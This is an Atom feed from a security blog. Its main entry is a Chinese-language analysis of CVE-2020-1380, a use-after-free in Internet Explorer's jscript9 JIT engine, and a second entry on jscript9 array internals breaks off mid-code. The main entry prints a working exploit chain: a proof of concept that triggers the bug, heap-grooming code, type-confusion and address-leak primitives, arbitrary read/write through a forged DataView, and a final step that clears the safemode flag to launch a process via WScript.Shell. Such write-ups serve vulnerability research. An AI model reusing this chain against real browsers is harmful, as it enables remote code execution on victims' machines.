<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Richardo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://richard447.github.io/"/>
  <updated>2021-03-06T16:00:00.000Z</updated>
  <id>https://richard447.github.io/</id>
  
  <author>
    <name>Richardo.M</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2020-1380漏洞利用及EXP构造</title>
    <link href="https://richard447.github.io/2020/12/27/CVE-2020-1380%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8AEXP%E6%9E%84%E9%80%A0/"/>
    <id>https://richard447.github.io/2020/12/27/CVE-2020-1380漏洞利用及EXP构造/</id>
    <published>2020-12-26T16:00:00.000Z</published>
    <updated>2021-03-06T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-1380漏洞分析及利用"><a href="#CVE-2020-1380漏洞分析及利用" class="headerlink" title="CVE-2020-1380漏洞分析及利用"></a>CVE-2020-1380漏洞分析及利用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        CVE-2020-1380是2020年8月修复的一个<strong>IE</strong>漏洞，类型是UAF，该漏洞是由<strong>js</strong>引擎<strong>JIT</strong>(Just in time)优化和即时编译代码中缺少必要检测引起。该漏洞最早于2020年5月被卡巴斯基在一次对韩国公司的IE恶意脚本攻击中发现，在其进一步分析发现这次攻击中利用了两个0day漏洞，IE的远程代码执行漏洞(CVE-2020-1380)和Windows特权提升漏洞(CVE-2020-0986)。</p><h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><ul><li>jscript9.dll——File Version: <strong>11.0.9600.17840</strong></li><li>Win7————–<strong>X86</strong></li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h6 id="Poc代码"><a href="#Poc代码" class="headerlink" title="Poc代码"></a>Poc代码</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">T, A, F, O2</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">arguments</span>.push = <span class="built_in">Array</span>.prototype.push;</span><br><span class="line">    T = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">arguments</span>.length = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">arguments</span>.push(O2);</span><br><span class="line">    <span class="keyword">if</span> (F == <span class="number">1</span>) &#123;</span><br><span class="line">        T = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// execute abp.valueOf() and write by dangling pointer</span></span><br><span class="line">    A[<span class="number">0</span>] = T;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// prepare objects</span></span><br><span class="line"><span class="keyword">var</span> an = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x8c</span>);</span><br><span class="line"><span class="keyword">var</span> fa = <span class="keyword">new</span> <span class="built_in">Float32Array</span>(an);</span><br><span class="line"><span class="comment">// compile func</span></span><br><span class="line">func(<span class="number">1</span>, fa, <span class="number">1</span>, &#123;&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++) &#123;</span><br><span class="line">    func(<span class="number">1</span>, fa, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> abp = &#123;&#125;;</span><br><span class="line">abp.valueOf = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// free </span></span><br><span class="line">alert(<span class="string">&quot;Free&quot;</span>);</span><br><span class="line">  worker = <span class="keyword">new</span> Worker(<span class="string">&#x27;worker.js&#x27;</span>);</span><br><span class="line">    worker.postMessage(an, [an]);</span><br><span class="line">    worker.terminate();</span><br><span class="line">    worker = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sleep</span></span><br><span class="line">    <span class="keyword">var</span> start = <span class="built_in">Date</span>.now();</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">Date</span>.now() - start &lt; <span class="number">200</span>) &#123;&#125;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> reclaim freed memory</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">44</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    func(<span class="number">1</span>,fa,<span class="number">0</span>,abp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    location.reload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Poc分析"><a href="#Poc分析" class="headerlink" title="Poc分析"></a>Poc分析</h6><ul><li>通过阅读poc，可以得到其主要分为三部分<ul><li>func函数赋值<ul><li>func函数的结构很简单，其主要通过arguments对象将自身函数的参数长度清0，然后使用push传入参数，这会导致T被O2替换，但是在F为1的情况下T和O2均为整型，不会发生类型转换，但T在赋值为A[0]时则会触发</li></ul></li><li>valueOf函数重构<ul><li>重构这个函数，在abp对象被赋值时会回调该函数，函数内部将使用postMessage将ArrayBuffer对象发往另外一个进程，这会导致ArrayBuffer无法在当前进程上下文使用，再使用模拟休眠的while循环代码，触发垃圾回收机制，让ArrayBuffer指针被释放</li></ul></li><li>for循环触发JIT<ul><li>for循环多次将会触发JIT代码优化，由于最后一次调用的f设置为0，并将abp对象转换为T(整型)，此处发生了隐式类型转换，导致T可以在优化后调用valueOf回调函数</li></ul></li></ul></li><li>当代码执行，func最后一次调用中，fa数组的0号元素被赋值为T，但此时T为abp对象，并会去调用abp的回调函数，在回调函数中，abp会使ArrayBuffer释放，而fa数组中用于存放数据的地址仍然执行这块被释放的地址，这就导致了fa函数在赋值时访问了空指针，而触发崩溃。</li></ul><h6 id="Poc调试"><a href="#Poc调试" class="headerlink" title="Poc调试"></a>Poc调试</h6><ul><li>打开poc的html文件，使用windbg调试附加进程，下如下几个断点</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bp jscript9!js::javascriptArrayBuffer+0x53 &quot;.if(edi!=0x8c)&#123;gc;&#125;&quot;    //ArrayBuffer生成的地方</span><br><span class="line">bp jscript9!js::javascriptConversion::Tofloat_helper</span><br><span class="line">bp jscript9!js::neuteredStateBase::CleanUp</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20210108185641119.png" alt="picture"><br><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20210108185656309.png" alt="picture"></p><ul><li>具体漏洞原因分析参考：<a href="https://www.trendmicro.com/en_us/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html">https://www.trendmicro.com/en_us/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html</a></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h6 id="内存占位"><a href="#内存占位" class="headerlink" title="内存占位"></a>内存占位</h6><ul><li>由于是申请的ArrayBuffer被释放，而ArrayBuffer的内存大小也是我们可控的，但是现在有一个问题，如果要占位到ArrayBuffer的内存空间，必须得选择内存空间申请和ArrayBuffer在同一块内存空间中的数据类型，通过对jscript9.dll中的ArrayBuffer对象生成函数分析(JavascriptArrayBuffer::Create)，ArrayBuffer的结构如下</li></ul><p><img src="C:\Users\Demon\Desktop\blog\cve2020-1380报告\images\image-20201224205204872.png" alt="picture"><br><img src="C:\Users\Demon\Desktop\blog\cve2020-1380报告\images\image-20201224162836786.png" alt="picture"><br><img src="C:\Users\Demon\Desktop\blog\cve2020-1380报告\images\image-20201225100949114.png" alt="picture"></p><ul><li>可以发现ArrayBuffer对象中用于存放数据的空间是使用malloc申请的，通过研究，发现在IE浏览器中存在两个堆,CRT Heap和Custom Heap，ArrayBuffer和LargeHeapBlock正好是位于CRT Heap上，而常规的TypedArray、Array都是在Custom Heap上。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/0-2.png-w331s" alt="IE堆布局"></p><ul><li>LargeHeapBlock不是js代码中能直接进行申请的对象，其只是为大型的Array对象所创建，也就是说当生成大型的Array对象时会分配LargeHeapBlock对象来维护Array，通过调试js中申请大型Array对象时就可以发现该特点。但是LargeHeapBlock的大小是不确定的，可在其反编译代码中看到，其对象结构如下</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20210108145740935.png" alt="picture"><br><img src="https://gitee.com/recird/blogimages/raw/master/img/LargeHeapBlock.png" alt="picture"></p><ul><li>通过计算，最终申请的大小计算公式如下，可以确定的是LargeHeapBlock对象的结构一定是大于等于0x58的，如何稳定控制LargeHeapBlock对象的大小然后将其用于占用被释放的ArrayBuffer对象的内存空间？在前人的研究中，有两篇文章介绍到了LargeHeapBlock的申请方式，在”Hack Away at the Unessential” with ExpLib2 in Metasploit”这篇文章提到对LargeHeapBlock对象的申请过程有一个清晰的描述。当对Array传入参数为(0x1000-0x20)/4时，申请到的LargeHeapBlock为0x8c或0x80，而在“The Art of Leaks: The Return of Heap Feng Shui”文中提到，对Array传入参数为(0x3bf8)时，申请到的LargeHeapBlock对象大小为0x68，当传入不同参数时，LargeHeapBlock大小又会发生不同的变化。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(a4/32+a4)*5+0x58</span><br></pre></td></tr></table></figure><ul><li>经过测试，在使用PostMessage之后，ArrayBuffer在进程上下文中将不可用，使用while循环模拟休眠，则会将ArrayBuffer释放，此时使用如下代码创建大量的Array数组则会生成LargeHeapBlock对象</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line">R1[i] = <span class="keyword">new</span> <span class="built_in">Array</span>((<span class="number">0x1000</span>-<span class="number">0x20</span>)/<span class="number">4</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;R1[i].length;++j)</span><br><span class="line">&#123;</span><br><span class="line">R1[i][j] = <span class="number">0x666</span>;   <span class="comment">//flag</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果成功占位则不会发生崩溃，因为在ToFloat_helper函数中Float32Array对象的Buffer指针指向的内存空间不为空。接下来，将调用赋值语句，对Float32Array的5号元素赋值为0，因为目前Float32Array的Buffer指向的是LargeHeapBlock对象，这步操作将会导致占位的LargeHeapBlock对象的（5*0x4=0x14）处数据被置0，而偏移0x14处数据Allocated Block Count表示存储Array分配的缓冲区块数，此时进行手动GC，则会导致系统回收当前LargeHeapBlock这一部分的Array。</li></ul><p><img src="C:\Users\Demon\Desktop\blog\cve2020-1380报告\images\image-20210108153100965.png" alt="picture"></p><ul><li>虽然系统回收了这一部分Array，但是缓冲区的数据保持不变，此时如果按照相同的方式(如下)申请大量的Array，就极有可能占位到这一块Array对象的缓冲区，这样就会导致R1数组中的部分数组访问的缓冲区也能被R2数组中部分数组访问，这样的情况可能会导致这块缓冲区被滥用。通过遍历两个数组，找出拥有同一块Buffer的两个数组，便于后续的利用。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line">R2[i] = <span class="keyword">new</span> <span class="built_in">Array</span>((<span class="number">0x1000</span>-<span class="number">0x20</span>)/<span class="number">4</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;R2[i].length;++j)</span><br><span class="line">&#123;</span><br><span class="line">R2[i][j] = <span class="number">0x888</span>;   <span class="comment">//flag</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> index1=<span class="number">0</span>,index2=<span class="number">0</span>;      <span class="comment">//find flag</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;R1.length;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(R1[i][<span class="number">0</span>]==<span class="number">0x888</span>)</span><br><span class="line">&#123;</span><br><span class="line">index1 = i;</span><br><span class="line">R1[index1][<span class="number">0</span>]=<span class="number">0x666</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;R2.length;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(R2[i][<span class="number">0</span>]==<span class="number">0x666</span>)</span><br><span class="line">&#123;</span><br><span class="line">index2 = i;    <span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h6><ul><li>上面通过搜寻获取到两个占用同一块内存的Array后，就可以开始进行类型混淆，之所以要进行类型混淆，是因为两个IntArray并不能进行漏洞利用，需要将其中一个Array的类型进行改变，这样能够使IntArray非法访问到其他类型Array的数据，这里将IntArray转换成一个Obj_array</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int_arr = R1[index1];</span><br><span class="line">R2[index2][<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">obj_arr = R2[index2];</span><br></pre></td></tr></table></figure><ul><li>对R2[index2]中元素赋值为字典对象后，R2[index2]数组的类型便会从一个NativeIntArray变为Array</li></ul><p><img src="C:\Users\Demon\Desktop\blog\cve2020-1380报告\images\image-20210108161913544.png" alt="picture"></p><h6 id="任意地址泄露"><a href="#任意地址泄露" class="headerlink" title="任意地址泄露"></a>任意地址泄露</h6><ul><li>上面获取到了两个不同类型的数组但公用同一块内存空间的数组，便可以使用如下任意对象地址泄露原语</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak_obj</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">obj_arr[<span class="number">2</span>] = obj;</span><br><span class="line"><span class="keyword">return</span> int_arr[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过调试可以发现，当使用该leak_obj泄露对象时，便可以直接获取对象的地址。</li></ul><p><img src="C:\Users\Demon\Desktop\blog\cve2020-1380报告\images\image-20210108162240644.png" alt="picture"></p><h6 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h6><ul><li>目前可以根据两个数组进行任意对象地址泄露，这还无法完成利用，只有实现任意地址读写才能够进行下一步的漏洞利用，在js的数据对象中，存在一种DataView对象，其能够对一个二进制ArrayBuffer对象中读取多个数值类型。其结构如下</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20210108162941266.png" alt="picture"></p><ul><li>现在要利用这两个类型混淆的数组来伪造一个可以实现任意地址读写的DataView对象，如果我们伪造了一个DataView对象，则可以通过控制其Buffer-Addr的值来进行任意地址读写，那么Buffer-Addr可控，可以想到需要使用一个数组来存储DataView的虚表、Dynamic-Type等等几个关键地址，但是正常的数组我们只能泄露其对象的地址，而无法获取其Buffer的区域</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20210108163401475.png" alt="picture"></p><ul><li>有趣的是javascript中有一种数据类型NativeArray，其结构如下，如果泄露NativeArray对象的基址，那么通过基址+0x38就可以定位到NativeArray的内存空间，如果我们将obj_arr[1]设置为这个地址，那么js默认会将obj_arr[1]当作一个对象，再使用DataView对obj_arr[1]进行读写就可以完成任意地址的读写。(PS:NativeArray中的元素最多不能超过0x10个)。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_obj = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">fake_obj[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">fake_obj[<span class="number">1</span>] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20210108164159929.png" alt="picture"></p><ul><li>根据Ox9A82师傅则在<a href="https://www.anquanke.com/post/id/98774">安全客</a>上的构造步骤，我们可以对NativeArray进行赋值，按照需要填充NativeArray，使其成为一个伪造的DataView，因为如果要对DataView进行访问的话，则需要访问其虚表，但是我们无法泄露出虚表的地址，这里提供了一个新的方式访问DataView的数据</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var fake_dataview = new DataView(new ArrayBuffer(0x30));</span><br><span class="line">DataView.prototype.getInt32.call(fake_dataview,0);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20210108171116834.png" alt="picture"></p><ul><li>使用该方法时将fake_dataView当作一个指针，不会去解析其虚表内容，这样就避免了去访问虚表的问题。根据文章的说法，接下来只要将Dynamic-Typed填充为合法的指针地址，且Dynamic-Typed指向内容的第二项(javascriptLibrary)也为合法指针，并且使伪造的ArrayBuffer对象也为合法指针则在DataView进行读写数据时不会发生Crash，读写数据使用如下原语</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read4</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">fake_obj[<span class="number">7</span>] = addr;</span><br><span class="line">low8 = <span class="built_in">DataView</span>.prototype.getUint16.call(obj_arr[<span class="number">1</span>],<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">high8 = <span class="built_in">DataView</span>.prototype.getUint16.call(obj_arr[<span class="number">1</span>],<span class="number">2</span>,<span class="literal">true</span>);</span><br><span class="line">value = (high8 &lt;&lt; <span class="number">0x10</span>) +low8;</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write4</span>(<span class="params">addr,value</span>)</span>&#123;</span><br><span class="line">fake_obj[<span class="number">7</span>] = addr;</span><br><span class="line">low8 = <span class="number">0xffff</span> &amp; value;</span><br><span class="line">high8 = (<span class="number">0xffff0000</span> &amp; value) &gt;&gt; <span class="number">0x10</span>;</span><br><span class="line"><span class="built_in">DataView</span>.prototype.setUint16.call(obj_arr[<span class="number">1</span>],<span class="number">0</span>,low8,<span class="literal">true</span>);</span><br><span class="line"><span class="built_in">DataView</span>.prototype.setUint16.call(obj_arr[<span class="number">1</span>],<span class="number">2</span>,high8,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>但实际上并非如此，通过对jscript9.dll中dataView读写数据进行逆向，我发现getUint6这个函数在调用时会去检擦Dynamic中的第二项javascriptLibrary，并调用其中的函数，这会导致伪造的DataView无法正常工作并Crash</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20210108172434967.png" alt="picture"></p><ul><li>通过分析其它几个函数，发现仅有数据类型为Uint时没有对Dynamic进行访问，但是读取的数据必须满足条件，通过调试发现DataView的Dynamic-Type刚好满足读取的条件，这刚好可以用于修复这个读取数据的Crash</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20210108172555198.png" alt="picture"></p><ul><li>使用如下语句可以在未修复Dynamic-Typed时进行读取数据</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Leak_Dynamic_Type_Addr</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">fake_obj[<span class="number">7</span>] = addr;</span><br><span class="line"><span class="keyword">var</span> p = <span class="built_in">DataView</span>.prototype.getUint32.call(obj_arr[<span class="number">1</span>],<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> Dynamic_addr = Leak_Dynamic_Type_Addr(dv_obj_addr+<span class="number">0x04</span>);</span><br><span class="line">fake_obj[<span class="number">1</span>] = Dynamic_addr;</span><br></pre></td></tr></table></figure><h6 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h6><ul><li>修改safemode标志位，开启上帝模式<ul><li>使用如下语句修改safemode标志,并执行代码</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run_calc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> shell = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Wscript.shell&quot;</span>);</span><br><span class="line">shell.Exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> leak_activeX_addr = leak_obj(ActiveXObject);</span><br><span class="line"><span class="keyword">var</span> script_engine = read4(read4(leak_activeX_addr+<span class="number">0x1c</span>)+<span class="number">0x04</span>);</span><br><span class="line"><span class="keyword">var</span> safe_mode = script_engine+<span class="number">0x1f4</span>;</span><br><span class="line">write4(safe_mode,<span class="number">0</span>);</span><br><span class="line">run_calc();</span><br></pre></td></tr></table></figure><h2 id="引用资料"><a href="#引用资料" class="headerlink" title="引用资料"></a>引用资料</h2><ul><li><a href="https://www.sohu.com/a/427522049_120054144">看雪SDC-在野0Day漏洞分析利用及复现</a></li><li><p><a href="https://labs.bluefrostsecurity.de/files/Look_Mom_I_Dont_Use_Shellcode-WP.pdf">Look_Mom_I_Dont_Use_Shellcode-WP.pdf</a></p></li><li><p><a href="https://www.trendmicro.com/en_us/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html">CVE-2020-1380最近修复的IE0day漏洞分析</a></p></li><li><p><a href="https://bbs.pediy.com/thread-263885.htm">IE Jscript9.dll UAF漏洞(CVE-2020-1380)利用复现笔记</a></p></li><li><p><a href="https://doc.lagout.org/security/2013_the_art_of_leak.pdf">the_art_of_leak</a></p></li><li><p><a href="https://blog.rapid7.com/2014/04/07/hack-away-at-the-unessential-with-explib2-in-metasploit/">Hack Away at the Unessential” with ExpLib2 in Metasploit</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2020-1380漏洞分析及利用&quot;&gt;&lt;a href=&quot;#CVE-2020-1380漏洞分析及利用&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-1380漏洞分析及利用&quot;&gt;&lt;/a&gt;CVE-2020-1380漏洞分析及利用&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="漏洞分析" scheme="https://richard447.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="CVE-2020-1380" scheme="https://richard447.github.io/tags/CVE-2020-1380/"/>
    
  </entry>
  
  <entry>
    <title>IEJscript9中的一些数据对象研究</title>
    <link href="https://richard447.github.io/2020/12/25/IE%E4%B8%ADJscript9%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%93%E6%9E%84%E7%A0%94%E7%A9%B6/"/>
    <id>https://richard447.github.io/2020/12/25/IE中Jscript9中的一些结构研究/</id>
    <published>2020-12-24T16:00:00.000Z</published>
    <updated>2021-03-06T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JS中一些对象结构的研究"><a href="#JS中一些对象结构的研究" class="headerlink" title="JS中一些对象结构的研究"></a>JS中一些对象结构的研究</h1><h2 id="Array对象"><a href="#Array对象" class="headerlink" title="Array对象"></a>Array对象</h2><h6 id="代码层"><a href="#代码层" class="headerlink" title="代码层"></a>代码层</h6><ul><li>Array对象是一个很宽泛的对象，可以在单个变量中存储多个值，并且Array对象的元素赋值不受类型限制，如下</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> an = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">10</span>);</span><br><span class="line">an[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">an[<span class="number">1</span>] = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">an[<span class="number">2</span>] = <span class="string">&quot;2.2&quot;</span></span><br><span class="line"><span class="built_in">console</span>.log(an);   <span class="comment">//1,&quot;a&quot;,2.2</span></span><br></pre></td></tr></table></figure><h6 id="系统底层"><a href="#系统底层" class="headerlink" title="系统底层"></a>系统底层</h6><ul><li>由于JS中没有十分明显的处理函数，只能通过调试来查看，编写如下代码</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(<span class="string">&quot;Start!&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i&lt;<span class="number">0x1000</span>; i++)&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">a[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1000</span>/<span class="number">4</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; a[i].length;j++)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">a[i][j] = <span class="number">0x666</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span 